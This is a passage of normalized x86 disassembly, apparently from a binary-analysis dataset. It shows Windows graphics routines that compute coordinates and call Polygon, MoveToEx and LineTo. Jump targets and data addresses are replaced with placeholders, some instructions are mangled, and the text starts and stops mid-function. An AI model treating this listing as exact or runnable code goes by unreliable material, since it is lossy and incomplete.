lea edx [ eax + 0xd8 ]
mov ecx [ ebp - 0x320 ]
mov eax [ ebp - 0x4 ]
call sub_45cd60
cmp [ ebp + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
inc ebx
mov [ ebp - 0x35c ] 0x2
lea eax [ ebp - 0x30c ]
mov eax [ ebp - 0x214 ]
inc eax
push eax
lea eax [ ebp - 0x31c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_41dd60
push eax
call Polygon
xor edx edx
xor eax eax
mov [ ebp - 0x20c ] eax
xor eax eax
mov [ ebp - 0x210 ] eax
mov ebx [ ebp - 0x214 ]
sub ebx 0x2
jl r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x31c ]
mov [ eax + 0xc0 ] edx
mov edx [ ebp - 0x318 ]
mov [ eax + 0xc4 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x314 ]
mov [ eax + 0xc8 ] edx
mov edx [ ebp - 0x310 ]
mov [ eax + 0xcc ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x214 ]
add edx edx
mov ecx [ ebp + edx * 8 - 0x210 ]
mov [ eax + 0xd0 ] ecx
mov ecx [ ebp + edx * 8 - 0x20c ]
mov [ eax + 0xd4 ] ecx
mov eax [ ebp - 0x324 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0xd8 ]
mov ecx [ ebp - 0x320 ]
mov eax [ ebp - 0x4 ]
call sub_45cd60
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45cc3c
push ebp
mov al 0x20
call sub_45ea78
pop ecx
inc [ ebp - 0x35c ]
add eax 0x8
dec ebx
jne r-xdata
mov eax [ ebp - 0x35c ]
dec eax
mov [ ebp - 0x20c ] eax
mov cl 0x1
mov esi [ ebp - 0x35c ]
inc esi
mov edi [ ebp - 0x214 ]
dec edi
sub edi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_45cc3c
push ebp
mov al 0x20
call sub_45ea78
pop ecx
mov ecx [ eax ]
cmp ecx [ eax - 0x8 ]
jle r-xdata
test dl dl
jne r-xdata
inc edi
lea eax [ ebp + esi * 8 - 0x314 ]
test dl cl
je r-xdata
mov eax [ ebp - 0x214 ]
mov eax [ ebp + eax * 8 - 0x31c ]
mov ebx [ ebp - 0x214 ]
cmp eax [ ebp + ebx * 8 - 0x324 ]
jl r-xdata
inc esi
add eax 0x8
dec edi
jne r-xdata
mov [ ebp - 0x210 ] esi
mov dl 0x1
jmp r-xdata
mov eax [ ebp - 0x210 ]
cmp eax [ ebp - 0x214 ]
je r-xdata
push ebp
call sub_45ead0
pop ecx
mov eax [ ebp - 0x214 ]
mov [ ebp - 0x210 ] eax
mov dl 0x1
mov ebx [ eax ]
cmp ebx [ eax - 0x8 ]
jge r-xdata
mov eax [ ebp - 0x214 ]
mov eax [ ebp + eax * 8 - 0x31c ]
mov edx [ ebp - 0x214 ]
cmp eax [ ebp + edx * 8 - 0x324 ]
jle r-xdata
mov eax [ ebp - 0x214 ]
mov [ ebp - 0x210 ] eax
mov esi [ ebp - 0x214 ]
dec esi
jmp r-xdata
mov eax [ ebp + esi * 8 - 0x31c ]
cmp eax [ ebp + esi * 8 - 0x324 ]
jg r-xdata
dec esi
cmp esi 0x1
je r-xdata
cmp esi 0x1
jle r-xdata
mov [ ebp - 0x20c ] esi
push ebp
call sub_45ead0
pop ecx
jmp r-xdata
sub_45f09c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ esi ]
lea edx [ ebx + 0xc0 ]
mov eax ebx
call sub_45cd60
mov eax [ edi + 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ edi ]
lea edx [ ebx + 0xc8 ]
mov eax ebx
call sub_45cd60
mov eax [ edi + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ edi ]
lea edx [ ebx + 0xd0 ]
mov eax ebx
call sub_45cd60
mov eax [ esi + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ esi ]
lea edx [ ebx + 0xd8 ]
mov eax ebx
call sub_45cd60
mov eax ebx
call sub_45cc3c
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_45f114
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_41d72c
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_45e0ec
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_45e0ec
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_41d618
pop ebx
pop ebp
retn
sub_45f16c
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x10 ]
mov edi [ ebp + 0x14 ]
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_41d72c
test al al
jne r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_41d610
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
add edi esi
sar edi 0x1
jns r-xdata
adc eax 0x0
mov eax esi
sub eax edi
sar eax 0x1
jns r-xdata
mov [ ebp - 0x18 ] edi
test bl bl
je r-xdata
adc edi 0x0
mov edi [ ebp + 0x18 ]
sub edi [ ebp + 0x20 ]
shr edi 0x1
mov eax [ ebp + 0x18 ]
add eax [ ebp + 0x20 ]
shr eax 0x1
mov [ ebp - 0x14 ] eax
mov ebx 0x1
lea esi [ ebp - 0x108 ]
mov edi [ ebp + 0x1c ]
sub edi [ ebp - 0xc ]
shr edi 0x1
mov eax [ ebp + 0x1c ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x18 ]
sub eax [ ebp + 0x20 ]
cdq
xor eax edx
sub eax edx
mov [ ebp - 0x10 ] eax
mov ebx 0x1
lea esi [ ebp - 0x108 ]
mov eax [ ebp - 0xc ]
mov [ esi ] eax
mov eax [ ebp + 0x1c ]
mov [ esi ] eax
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp + 0x20 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
mov eax ebx
sub eax 0x5
mov [ ebp - 0x18c ] eax
fild [ ebp - 0x18c ]
fld [ r-xdata ]
fmulp st1
add esp 0xfffffff4
fstp [ esp ]
fwait
lea edx [ ebp - 0x40 ]
lea eax [ ebp - 0x30 ]
call sub_45c414
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x1c ]
jge r-xdata
imul edi [ ebp + 0x8 ]
mov [ ebp - 0x18c ] edi
fild [ ebp - 0x18c ]
fdiv [ r-xdata ]
call sub_402990
mov edi eax
mov eax [ ebp - 0x1c ]
imul [ ebp + 0x8 ]
mov [ ebp - 0x18c ] eax
fild [ ebp - 0x18c ]
fdiv [ r-xdata ]
call sub_402990
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x1c ]
sub eax [ ebp - 0xc ]
cdq
xor eax edx
sub eax edx
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x104 ]
push eax
mov eax [ ebp - 0x100 ]
push eax
mov ecx [ ebp - 0x108 ]
sub ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x180 ]
mov eax [ ebp - 0x4 ]
call sub_45cd60
push 0xbfff
push 0xc90fdaa2
push 0x2168c235
lea edx [ ebp - 0x40 ]
lea eax [ ebp - 0x30 ]
call sub_45c414
mov [ ebp - 0x18c ] edi
fild [ ebp - 0x18c ]
fld [ ebp - 0x30 ]
fmulp st1
call sub_402990
add eax [ ebp - 0x14 ]
mov [ ebp - 0x104 ] eax
fild [ ebp - 0x1c ]
fld [ ebp - 0x40 ]
fmulp st1
call sub_402990
mov edx [ ebp - 0x18 ]
sub edx eax
mov [ ebp - 0x100 ] edx
lea ecx [ ebp - 0x194 ]
lea edx [ ebp - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_45cd18
mov eax [ ebp - 0x194 ]
mov [ ebp - 0x188 ] eax
mov eax [ ebp - 0x190 ]
mov [ ebp - 0x184 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
mov ebx 0x2
lea esi [ ebp - 0xfc ]
mov [ ebp - 0x18c ] edi
fild [ ebp - 0x18c ]
fld [ ebp - 0x30 ]
fmulp st1
call sub_402990
add eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
fild [ ebp - 0x1c ]
fld [ ebp - 0x40 ]
fmulp st1
call sub_402990
mov edx [ ebp - 0x18 ]
sub edx eax
mov [ esi + 0x8 ] edx
inc ebx
add esi 0xc
cmp ebx 0x11
jne r-xdata
mov eax ebx
sub eax 0x4
mov [ ebp - 0x18c ] eax
fild [ ebp - 0x18c ]
fld [ r-xdata ]
fmulp st1
add esp 0xfffffff4
fstp [ esp ]
fwait
lea edx [ ebp - 0x40 ]
lea eax [ ebp - 0x30 ]
call sub_45c414
mov [ ebp - 0x18c ] edi
fild [ ebp - 0x18c ]
fld [ ebp - 0x30 ]
fmulp st1
call sub_402990
add eax [ ebp - 0x14 ]
mov [ esi ] eax
mov eax [ ebp + 0x20 ]
cmp eax [ ebp + 0x18 ]
jge r-xdata
imul edi [ ebp + 0x8 ]
mov [ ebp - 0x18c ] edi
fild [ ebp - 0x18c ]
fdiv [ r-xdata ]
call sub_402990
mov edi eax
mov eax [ ebp - 0x1c ]
imul [ ebp + 0x8 ]
mov [ ebp - 0x18c ] eax
fild [ ebp - 0x18c ]
fdiv [ r-xdata ]
call sub_402990
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x104 ]
add eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x100 ]
push eax
lea edx [ ebp - 0x180 ]
mov ecx [ ebp - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_45cd60
push 0xbfff
push 0x96cbe3f9
push 0x990e91a8
lea edx [ ebp - 0x40 ]
lea eax [ ebp - 0x30 ]
call sub_45c414
mov [ ebp - 0x18c ] edi
fild [ ebp - 0x18c ]
fld [ ebp - 0x30 ]
fmulp st1
call sub_402990
add eax [ ebp - 0x14 ]
mov [ ebp - 0x108 ] eax
fild [ ebp - 0x1c ]
fld [ ebp - 0x40 ]
fmulp st1
call sub_402990
mov edx [ ebp - 0x18 ]
sub edx eax
mov [ ebp - 0x100 ] edx
lea ecx [ ebp - 0x194 ]
lea edx [ ebp - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_45cd18
mov eax [ ebp - 0x194 ]
mov [ ebp - 0x188 ] eax
mov eax [ ebp - 0x190 ]
mov [ ebp - 0x184 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
mov ebx 0x2
lea esi [ ebp - 0xfc ]
fild [ ebp - 0x1c ]
fld [ ebp - 0x40 ]
fmulp st1
call sub_402990
mov edx [ ebp - 0x18 ]
sub edx eax
mov [ esi + 0x8 ] edx
inc ebx
add esi 0xc
cmp ebx 0x11
jne r-xdata
mov eax [ ebp - 0x170 ]
mov [ ebp - 0x188 ] eax
mov eax [ ebp - 0x16c ]
mov [ ebp - 0x184 ] eax
mov eax [ ebp - 0x178 ]
mov [ ebp - 0x180 ] eax
mov eax [ ebp - 0x174 ]
mov [ ebp - 0x17c ] eax
inc [ ebp - 0x20 ]
inc ebx
add esi 0xc
cmp ebx 0x11
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x170 ]
mov [ ebp - 0x188 ] eax
mov eax [ ebp - 0x16c ]
mov [ ebp - 0x184 ] eax
mov eax [ ebp - 0x178 ]
mov [ ebp - 0x180 ] eax
mov eax [ ebp - 0x174 ]
mov [ ebp - 0x17c ] eax
inc [ ebp - 0x20 ]
inc ebx
add esi 0xc
cmp ebx 0x11
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax esi
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x48 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x48 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x48 ]
mov ecx [ eax ]
sub ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x178 ]
mov eax [ ebp - 0x4 ]
call sub_45cd60
mov eax ebx
sub eax 0x5
mov [ ebp - 0x18c ] eax
fild [ ebp - 0x18c ]
fld [ r-xdata ]
fmulp st1
add esp 0xfffffff4
fstp [ esp ]
fwait
lea edx [ ebp - 0x40 ]
lea eax [ ebp - 0x30 ]
call sub_45c414
mov [ ebp - 0x18c ] edi
fild [ ebp - 0x18c ]
fld [ ebp - 0x30 ]
fmulp st1
call sub_402990
add eax [ ebp - 0x14 ]
mov edx [ ebp - 0x48 ]
mov [ edx + 0x4 ] eax
fild [ ebp - 0x1c ]
fld [ ebp - 0x40 ]
fmulp st1
call sub_402990
mov edx [ ebp - 0x18 ]
sub edx eax
mov eax [ ebp - 0x48 ]
mov [ eax + 0x8 ] edx
lea ecx [ ebp - 0x194 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45cd18
mov eax [ ebp - 0x194 ]
mov [ ebp - 0x170 ] eax
mov eax [ ebp - 0x190 ]
mov [ ebp - 0x16c ] eax
mov eax [ ebp - 0x184 ]
sub eax [ ebp - 0x174 ]
add eax [ ebp - 0x17c ]
sub eax [ ebp - 0x16c ]
sets al
test al al
je r-xdata
mov ebx 0x10
lea esi [ ebp - 0x108 ]
lea edi [ ebp - 0x188 ]
push 0x4
lea eax [ ebp - 0x188 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_41dd60
push eax
call Polygon
push ebp
mov al [ ebp - 0x20 ]
shl eax 0x4
call sub_45f114
pop ecx
mov eax esi
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x44 ]
mov eax [ eax + 0x4 ]
add eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x44 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x44 ]
mov ecx [ eax ]
lea edx [ ebp - 0x178 ]
mov eax [ ebp - 0x4 ]
call sub_45cd60
mov eax ebx
sub eax 0x4
mov [ ebp - 0x18c ] eax
fild [ ebp - 0x18c ]
fld [ r-xdata ]
fmulp st1
add esp 0xfffffff4
fstp [ esp ]
fwait
lea edx [ ebp - 0x40 ]
lea eax [ ebp - 0x30 ]
call sub_45c414
mov [ ebp - 0x18c ] edi
fild [ ebp - 0x18c ]
fld [ ebp - 0x30 ]
fmulp st1
call sub_402990
add eax [ ebp - 0x14 ]
mov edx [ ebp - 0x44 ]
mov [ edx ] eax
fild [ ebp - 0x1c ]
fld [ ebp - 0x40 ]
fmulp st1
call sub_402990
mov edx [ ebp - 0x18 ]
sub edx eax
mov eax [ ebp - 0x44 ]
mov [ eax + 0x8 ] edx
lea ecx [ ebp - 0x194 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45cd18
mov eax [ ebp - 0x194 ]
mov [ ebp - 0x170 ] eax
mov eax [ ebp - 0x190 ]
mov [ ebp - 0x16c ] eax
mov eax [ ebp - 0x188 ]
sub eax [ ebp - 0x178 ]
add eax [ ebp - 0x180 ]
sub eax [ ebp - 0x170 ]
sets al
test al al
je r-xdata
jmp r-xdata
push 0x4
lea eax [ ebp - 0x188 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_41dd60
push eax
call Polygon
push ebp
mov al [ ebp - 0x20 ]
shl eax 0x4
call sub_45f114
pop ecx
lea ecx [ ebp - 0x194 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45cd18
mov eax [ ebp - 0x194 ]
mov [ edi ] eax
mov eax [ ebp - 0x190 ]
mov [ edi + 0x4 ] eax
add edi 0x8
add esi 0xc
dec ebx
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x10
lea eax [ ebp - 0x188 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_41dd60
push eax
call Polygon
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
push ebp
mov al [ rw-data ]
call sub_45f114
pop ecx
sub_45f80c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x18 ]
push ebx
mov ebx [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov bl [ ebp + 0x8 ]
push ebx
push 0x64
call sub_45f16c
pop ebx
pop ebp
retn 0x18
sub_45f834
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_41d72c
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_45e0ec
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_45e0ec
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_41d618
pop ebx
pop ebp
retn
sub_45f88c
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x9 ] dl
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_41d72c
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_41d610
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp esi [ ebp + 0x18 ]
je r-xdata
cmp ebx [ ebp + 0x1c ]
je r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
cmp esi [ ebp + 0x18 ]
jl r-xdata
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x10 ]
push eax
lea edx [ ebp - 0x11 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
call sub_45cd60
push ebx
mov eax [ ebp + 0x10 ]
push eax
lea edx [ ebp - 0x19 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
call sub_45cd60
mov eax [ ebp + 0x1c ]
add eax ebx
shr eax 0x1
push eax
mov eax [ ebp + 0x10 ]
add eax [ ebp + 0xc ]
shr eax 0x1
push eax
lea edx [ ebp - 0x31 ]
mov ecx [ ebp + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_45cd60
mov eax [ ebp - 0x11 ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0xd ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x31 ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x2d ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x19 ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x15 ]
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x4c ]
mov ecx 0x2
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x88 ]
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x1c ]
jg r-xdata
push ebx
mov eax [ ebp + 0x10 ]
push eax
lea edx [ ebp - 0x11 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
call sub_45cd60
push ebx
mov eax [ ebp + 0x10 ]
push eax
lea edx [ ebp - 0x19 ]
mov ecx [ ebp + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_45cd60
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x10 ]
add eax [ ebp + 0xc ]
sar eax 0x1
jns r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0xc ]
push eax
lea edx [ ebp - 0x21 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
call sub_45cd60
mov eax [ ebp - 0x11 ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0xd ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x31 ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x2d ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x21 ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x1d ]
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x4c ]
mov ecx 0x2
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x88 ]
push ebp
mov al [ rw-data ]
call sub_45f834
pop ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push eax
mov ecx [ ebp + 0x18 ]
add ecx esi
sar ecx 0x1
jns r-xdata
adc eax 0x0
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x1c ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x114 ]
push ebp
mov al [ rw-data ]
call sub_45f834
pop ecx
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x110 ]
jmp r-xdata
push ebp
mov al [ rw-data ]
call sub_45f834
pop ecx
lea edx [ ebp - 0x31 ]
mov eax [ ebp - 0x4 ]
call sub_45cd60
mov eax [ ebp - 0x11 ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0xd ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x31 ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x2d ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x19 ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x15 ]
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x4c ]
mov ecx 0x2
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x88 ]
cmp ebx [ ebp + 0x1c ]
jle r-xdata
adc ecx 0x0
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
mov eax [ ebp + 0xc ]
push eax
lea edx [ ebp - 0x21 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
call sub_45cd60
mov eax [ ebp - 0x1d ]
cmp eax [ ebp - 0x2d ]
jge r-xdata
push ebx
mov eax [ ebp + 0xc ]
push eax
lea edx [ ebp - 0x29 ]
mov ecx [ ebp + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_45cd60
mov eax [ ebp - 0x19 ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0x15 ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x31 ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x2d ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x29 ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x25 ]
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x4c ]
mov ecx 0x2
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x88 ]
cmp ebx [ ebp + 0x1c ]
jle r-xdata
push ebp
mov al [ rw-data ]
call sub_45f834
pop ecx
mov eax [ ebp - 0x11 ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0xd ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x31 ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x2d ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x21 ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x1d ]
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x4c ]
mov ecx 0x2
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x88 ]
mov eax [ ebp - 0x1d ]
cmp eax [ ebp - 0x2d ]
jge r-xdata
push ebx
mov eax [ ebp + 0xc ]
push eax
lea edx [ ebp - 0x21 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
call sub_45cd60
mov eax [ ebp - 0x31 ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0x2d ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x21 ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x1d ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x29 ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x25 ]
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x4c ]
mov ecx 0x2
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x88 ]
sub_45fbc4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
push esi
push edi
mov esi eax
lea edi [ ebx + 0xc0 ]
mov ecx 0x8
[ edi ] [ esi ]
pop edi
pop esi
lea edx [ ebx + 0xc0 ]
mov ecx esi
mov eax ebx
call sub_45cd0c
lea edx [ ebx + 0xc8 ]
mov ecx esi
mov eax ebx
call sub_45cd0c
lea edx [ ebx + 0xd0 ]
mov ecx edi
mov eax ebx
call sub_45cd0c
lea edx [ ebx + 0xd8 ]
mov ecx edi
mov eax ebx
call sub_45cd0c
mov eax ebx
call sub_45cc3c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_45fc38
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_45ceb8
mov eax [ ebx + 0xc ]
call sub_41d434
dec eax
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_41dd60
mov ebx eax
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push ebx
call MoveToEx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push ebx
call LineTo
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_45fd00
push ebx
mov ebx eax
cmp dl [ ebx + 0x99 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x99 ] dl
mov eax ebx
call sub_45ca60
mov [ ebx + 0x9a ] 0x1
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
call sub_45c6fc
sub_45fd30
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0xc ]
mov [ ebp - 0xc ] edi
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_45ceb8
mov eax [ ebx + 0x4 ]
call sub_41dd60
mov esi eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call MoveToEx
mov [ ebp - 0xc ] edi
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_45ceb8
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
call LineTo
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_45fda0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov [ ebp - 0x8 ] edi
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_45ceb8
mov eax [ ebx + 0x4 ]
call sub_41dd60
mov esi eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
call MoveToEx
mov [ ebp - 0x8 ] edi
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp + 0xc ]
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_45ceb8
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
call LineTo
pop edi
